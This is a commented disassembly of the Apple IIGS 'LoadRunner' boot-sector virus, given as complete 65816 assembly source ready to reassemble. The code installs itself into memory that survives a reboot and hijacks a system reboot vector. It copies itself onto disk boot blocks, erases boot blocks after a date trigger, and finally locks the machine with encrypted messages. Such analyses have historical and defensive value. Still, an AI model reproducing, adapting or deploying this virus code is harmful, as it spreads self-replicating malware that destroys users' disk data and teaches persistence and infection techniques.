**************************************************
*                                                *
*           -- The LoadRunner virus --           *
*       -- Disassembled by Derek Young --        *
*                                                *
**************************************************

HighBuffer = $61 ;high byte of IO buffer

UnitNum = $43
Command = $42 ;these are for the prodos device driver
Buffer = $44
BlockNum = $46

Tool_Entry = $E10000
ReadTimeHex = $0D03
NewHandle = $0902
PRNTAX = $F941
HOME = $FC58
WAIT = $FCA8
SPKR = $C030
OptionKey = $C062

Vector = $E11688

*-------------------------------------------------
 xc
 xc
 org $0800
 mx %11

H0800 hex 01 ;the one byte signature
 lda #$50
 sta UnitNum

 lda $C5FF
 sta Entry+1 ;set up the smartport entry vector

 stz $4A
 stz $4C
 stz $4E

 stz BlockNum+1
 stz Buffer
 ldy #$01
 sty Command ;Read command
 sty BlockNum ;block 1
 ldy #$0A ;read it into $A00
 sty HighBuffer
 jsr Block
 bcs RegularBoot ;do a prodos load

 ldal $E1BC00 ;has LoadRunner been installed in this computer?
 cmp #$01
 bne :Install
 ldal $E1BC02
 cmp #$50
 bne :Install
 ldal $E1168B
 cmp #$FF
 bne CheckTime
:Install brl InstallVirus

CheckTime clc
 xce
 rep $30
 pha
 pha
 pha
 pha
 ldx #ReadTimeHex
 jsl Tool_Entry
 plx  ;minute and second
 pla  ;year and hour
 ply  ;month and day
 pla  ;week day
 tya
 and #$0F00 ;single out the month
 cmp #$0900 ;is it after october?
 blt :NotYet

 sep $30
 lda #$02
 sta Command ;Write command
 stz BlockNum
 lda #$20 ;an unused part right now
 sta HighBuffer
 jsr Block ;erase block 0
 bcs :NotYet

 inc BlockNum
 jsr Block ;erase block 1
 bcs :NotYet

 lda #-1
 sta InfectFlag
 stal $E1BE51 ;put a signature byte in RAM
 stz H0800 ;indicate it has infected...

:NotYet sec
 xce
 lda H0800 ;was there an error?
 bne RegularBoot ;yes, do a regular bootup
 jmp RunVirus ;nope...

*-------------------------------------------------
* Perform a standard Prodos boot.

RegularBoot ldy #$01 ;do a real bootup
 sty Command ;read command
 iny
 sty BlockNum
 lda #$0C
 sta HighBuffer
 sta $4B
]loop jsr Block ;read block 2 into $C00
 bcs ProError ;print the prodos error message

 inc HighBuffer
 inc HighBuffer ;next memory address
 inc BlockNum ;next block
 lda BlockNum
 cmp #$06 ;read up to block 6
 blt ]loop
 lda #$04
 bne :1
:Next lda $4A
:1 clc
 adc #$27 ;skip to the first (next) name in the directory
 tay
 bcc :fine ;did we cross pages?
 inc $4B
 lda $4B ;is the new page number even?
 lsr
 bcs :fine ;no, just the high page
 cmp #$0A ;did we read to the end of the directory?
 beq ProError ;yes - prodos not found.
 ldy #$04 ;no.  Skip over the link bytes in the block
:fine sty $4A

 ldy #7-1
]loop lda ($4A),Y ;is this the "PRODOS" entry?
 cmp Prodos,Y
 bne :Next ;try the next entry
 dey
 bpl ]loop

 ldy #$11
 lda ($4A),Y ;get the file's key block
 sta BlockNum
 iny
 lda ($4A),Y
 sta BlockNum+1

 stz $4A
 ldy #$1E
 sty $4B ;read the key block into $1E00
 sty HighBuffer
 iny
 sty $4D
]loop jsr Block ;read a block of the file
 bcs ProError
 inc HighBuffer ;next spot in memory
 inc HighBuffer
 ldy $4E
 inc $4E
 lda ($4A),Y ;find the next block
 sta BlockNum
 lda ($4C),Y
 sta BlockNum+1
 ora ($4A),Y ;all done if the block number is 0
 bne ]loop
 jmp $2000 ;jump to the PRODOS file

ProError jsr HOME ;print the prodos error message
 ldy #$1C
]loop lda ErrMessage,Y
 sta $05AE,Y ;screen memory
 dey
 bpl ]loop
:Hang bmi :Hang

ErrMessage asc "*** UNABLE TO LOAD PRODOS ***"

Block   ;read/write a block
 lda HighBuffer
 sta Buffer+1
Entry jmp $C50A ;load a block

Prodos db $26 ;storage type/name length
 asc 'PRODOS'

*-------------------------------------------------
* This code installs the virus code into bank
* $E1 under the softswitches ($BC00-$BFFF).
* It allocates this memory with an ID of
* $0001 - the Memory Manager's ID.  This way it
* isn't cleared even after a reboot.

InstallVirus mx %00

 clc
 xce
 rep $30

 lda #0
 pha
 pha  ;result space

 pha
 pea $400 ;length of block
 pea $0001 ;Memory ID of $0001!
   ;this tells the memory manager to keep this
   ;block in memory even after rebooting.
 pea $C017 ;attributes

 pea $E1
 pea $BC00 ;location: $E1BC00
   ;this is just under the softswitches in $E1
 ldx #NewHandle
 jsl Tool_Entry
 ply
 ply  ;ignore the handle
 bcs :MemoryError

 lda #$400-1 ;copy both blocks 0 and 1
 ldx #$800 ;source - start of code
 ldy #$BC00 ;destination - memory block
 mvn $000000,$E10000 ;copy the code

   ;Now patch the reboot vector to point to the code
 lda Vector+2 ;all in bank $E1 now (MVN changes data bank...)
 sta $BE4F ;($A4F)
 lda #$E1BD
 sta Vector+2
 lda Vector ;point to $E1BD8A ($95A)
 sta $BE4D
 lda #$8A5C
 sta Vector ;patch into vector $E1/1688

:MemoryError phk
 plb
 sec
 xce
 brl CheckTime ;see if it's time to infect

 cpx #$02
 ora ($D0,X)
 php
 bra H099A

 ldal $000805
 beq H099A
 brl H0A4D

* Code normally pointed to by vector $E1/1688
* when GS/OS is active.

 do 0 ;don't assemble this part

 cpx #$0C02
 beq :1
 cpx #$0D02
 beq :1
 jml $FF0199
:1 txa
 xba
 sep $30
 and #$FF
 tax
 lda #$E1
 pha
 lda #$04
 jml $FF01A7

 fin

*------------------------------------------------*
*                                                *
* LoadRunner's "hidden" code.  This code         *
* is tucked away in bank $E1 under the soft-     *
* switches ($800-$A00).  LoadRunner allocates    *
* this memory with a memory ID of $0001 so that  *
* the code will remain in memory even after a    *
* reboot.  LoadRunner patches a secret GS vector *
* that allows it to be run every time the        *
* computer reboots.                              *
*                                                *
*------------------------------------------------*

 mx %00
H099A php
 phx
 phb
 phd
 lda #$400-1
 ldx #$BC00 ;source
 ldy #$800 ;destination
 mvn $E10000,$000000
 jml $0009AE ;bounce into bank 0

 lda #0 ;The above JML jumps to here (now in bank $00)
 tcd
 inc InfectCount
 pha
 pha  ;result space
 pha
 pha
 ldx #ReadTimeHex
 jsl Tool_Entry
 plx  ;minute and second
 pla  ;year and hour
 ply  ;month and day
 pla  ;week day
 tya
 and #$0F00 ;isolate the month
 cmp #$0800 ;is it October?
 blt :skip ;not yet...
 beq :October
 lda InfectFlag ;did it just infect a disk?
 beq :October ;no, keep checking
 brl RunVirus ;yes, run it!

:October tya
 and #1 ;is it an even day?
 bne :skip
 txa
 and #$0700 ;is the minute divisible by 8?
 bne :skip
 sec
 xce  ;emulation

 lda $C034 ;get the border color
 tax
 and #$F0
 sta Command
 txa
 inc
 and #$0F
 ora Command
 sta $C034 ;increment the border color

:skip sec
 xce
 lda OptionKey ;is the option key pressed?
 bpl :Infect ;no...

 ldx InfectCount ;if so, print the infection count
 lda InfectCount+1
 jsr PRNTAX

:Infect lda #$01
 sta Command ;read command
 lda #$50
 sta UnitNum
 stz Buffer
 lda #$10
 sta HighBuffer ;$1000
 stz BlockNum
 stz BlockNum+1 ;block 0
 jsr Block ;read in block o to $1000
 bcs :Exit

 lda $1001 ;read the second byte of the block loaded
 cmp #$38
 bne :Exit

 lda #$08 ;$800
 sta HighBuffer
 inc Command ;write command
 jsr Block
 bcs :Exit ;write the virus to block 0

 inc HighBuffer
 inc HighBuffer
 inc BlockNum
 jsr Block ;write the second half of it
 bcs :Exit

 clc
 xce
 rep $30
 lda InfectCount ;store the infection count in the virus's
 stal $E1BF19 ;"private" memory

:Exit clc
 xce  ;always exit in native mode
 rep $30
 pld
 plb  ;reset everything
 plx
 plp
H0A4D jml $FF0199 ;this instruction patched

InfectFlag dw 0

*-------------------------------------------------
*
*         Virus time!
*         This is the code that is executed when
*         the virus is triggered.

RunVirus sec
 xce
 inc $3F4 ;force a reboot
 sei  ;disable the control panel and all other interrupts
 lda #$80
 sta $C036 ;fast system speed
 lda #$0F
 sta $C03C ;Hi volume
 lda #$F1
 sta $C022 ;White text, deep red background
 lda #$41
 sta $C034 ;deep red border
 jsr HOME ;clear the screen
 sta $C00C ;go to 40 column mode

 ldy #$1E ;string length
 stz $61 ;start the key at zero
]loop1 lda Message1,Y ;get the data...
 jsr Decrypt ;...decrypt it...
 sta $52C,Y ;...and put it on the screen
 dey
 bpl ]loop1

 lda #'0' ;set up a countdown
 sta $63A
 lda #'9'+1
 sta $63B
 lda #$50
 sta $42

 ldy #10
]loop dec $63B ;tick down a second
 phy
 lda #$28
 sta $43
 jsr Sound
 lda #$30
 sta $43
 jsr Sound
 ply
 dey
 bne ]loop
 jsr HOME ;screen clear
 sta $C00C ;40 columns

 lda #$F4
 sta $C022 ;set the colors

 ldy #$1E
]loop2 lda Message2,Y
 jsr Decrypt
 sta $704,Y
 dey
 bpl ]loop2

 ldy #$25
]loop3 lda Message3,Y
 jsr Decrypt
 sta $729,Y
 dey
 bpl ]loop3

 ldy #$1D
]loop4 lda Message4,Y
 jsr Decrypt
 sta $6D5,Y
 dey
 bpl ]loop4

 ldy #$27
]loop5 lda Message5,Y
 jsr Decrypt
 sta $7D0,Y
 dey
 bpl ]loop5

 ldy #$1F
]loop6 lda Message6,Y
 jsr Decrypt
 sta $406,Y
 dey
 bpl ]loop6

 ldx InfectCount ;print the infection number?
 lda InfectCount+1
 jsr PRNTAX

]cycle lda #$08
 jsr WAIT
 lda $C034 ;cycle the border color
 inc
 and #$0F
 sta $C034
 bra ]cycle ;hang infinitely

Decrypt inc  ;decrypt a byte of the message
 eor $61
 sta $61 ;update the "key"
 rts

*-------------------------------------------------
* LoadRunner's data

InfectCount da 15 ;the infection count

Message6 HEX 2B1E180B155C0DFF632C190605477A32
 HEX 051C19061015526031FF1B0B090B1516

Message5 HEX 1054FF6C0B1106101600726210120107
 HEX 01060866721516031E090564FF100700
 HEX FF17FF6B3415001D

Message4 HEX 101251FFFF720504141671670801070D
 HEX 1671FF0505FF721A100A18090E1D

Message3 HEX 211607030B1651551E1A0605526D0000
 HEX 626800150605061516100F0671520506
 HEX 5168FF0D136D

Message2 HEX FFFF1CFF6B6B6E6E60606363FFFF7171
 HEX 74746D6D6D6D64647171FF1CFFFF15

Message1 HEX FFFF0AFF7209090610076CFF65060704
 HEX 18061664FF48064D1919FF0AFFFFAA

Sound ldy $42
:c ldx #0
:b txa
 clc
:a sbc #1
 bne :a
 sta SPKR
 inx
 cpx $43
 bne :b
 dey
 bne :c
 rts

 ds \

 sav My.Runner
